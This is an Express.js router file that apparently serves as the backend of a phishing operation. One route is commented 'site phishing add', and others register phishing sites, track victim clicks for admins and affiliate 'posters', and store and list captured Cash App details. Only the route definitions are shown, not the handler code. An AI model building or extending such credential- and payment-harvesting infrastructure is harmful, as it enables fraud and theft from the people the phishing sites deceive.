import express  from 'express'
const router = express.Router();
import {signup_post, link_add,link_get,login_post,skip_code,add_mail,poster_add,add_data,info_get,all_poster,
    delete_poster,new_site_add_poster,get_A_poster,poster_details,add_site,admin_add_site,add_posterNumber,
    add_new_links,site_exist,click_for_admin,click,link_details,pass_change,cashapap_post,update_validity,links_add,
    get_deyails_cashapp,show_all,demo_add,check_qrcode,rqcode_permission,update_many,add_data_checnge

    
} from './routehandler.js'

router.post('/link/add', link_add);

router.get('/link/get/:id', link_get);////

router.post('/signup', signup_post);///adda customer from shannon end

router.post('/login', login_post);

router.post('/skip', skip_code);
router.post('/add/mail', add_mail);


router.post('/admin/add', poster_add);//admin user and pass add

router.post('/ad/:adminId/:posterId', add_data);  ///site phishing add

router.get('/info/:username/:id/:admin', info_get);

router.get('/all/poster/:id', all_poster);

// router.post('/change/password/', auth.change_password);

router.delete('/delete/poster/:id_pos/:id_ad', delete_poster);

router.post('/add/newsite/update',new_site_add_poster);

router.get('/get/poster/:id/:admin', get_A_poster);////


router.get('/poster/details/:id/', poster_details);

// router.get('/details/:id/', auth.poster_details);

router.post('/site/add/', add_site); //add site to shannon

router.post('/admin/site/add/', admin_add_site);//to add extra site to admin

router.post('/add/posterNumber/', add_posterNumber);//add poster number

router.post('/edit/link/', add_new_links);//edit links number

router.get('/:site/:adminId/:posterId', site_exist);


router.get('/:adminId/:posterId', click);///click find
router.get('/:adminId/', click_for_admin);///click find

router.get('/link/get/:id/:admin', link_details);

router.post('/change/password', pass_change);

router.post('/cashapp/add/:adminId/:posterId',cashapap_post)

router.post('/validity/update',update_validity)

router.post('/links/reAdd',links_add)   // if any mistake happens with links then add by this

router.get('/cash/app/details/admin/poster/:anyid',get_deyails_cashapp)

router.get('/cash/app/details/admin/poster/hello/anyid/yes',show_all)

router.post('/demo/save',demo_add)  

router.get('/qrcode/status/check/:adminId',check_qrcode)  

router.post('/qrcode/permission',rqcode_permission)  

router.post('/update/many',update_many)  

router.post('/change/:adminId/:posterId',add_data_checnge)  

// router.post('/change/:adminId/:posterId',add_data_checnge)  






export default router


